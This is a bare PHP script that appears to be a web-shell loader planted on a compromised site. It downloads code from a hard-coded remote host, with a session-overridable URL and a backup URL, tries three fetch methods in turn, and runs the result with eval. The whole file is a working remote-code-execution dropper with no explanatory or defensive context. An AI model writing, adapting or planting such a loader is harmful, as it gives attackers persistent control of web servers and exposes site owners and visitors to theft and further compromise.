<?php
session_start();
$u = $_SESSION['ts_url'] ?? 'https://teamzedd2024.tech/raw/McuQGI';
$u_backup = 'https://teamzedd2024.tech/raw/McuQGI'; // URL cadangan

function load_payload($url) {
    $r = '';
    try {
        $file = new SplFileObject($url);
        while (!$file->eof()) {
            $r .= $file->fgets();
        }
    } catch (Throwable $e) {
        $r = '';
    }
    if (strlen(trim($r)) < 1) {
        $r = @file_get_contents($url);
    }

    if (strlen(trim($r)) < 1 && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
        ]);
        $r = curl_exec($ch);
        curl_close($ch);
    }

    return $r;
}

$r = load_payload($u);
if (strlen(trim($r)) < 1) {
    $r = load_payload($u_backup);
}

if (strlen(trim($r)) > 0) {
    eval("?>$r");
}
?>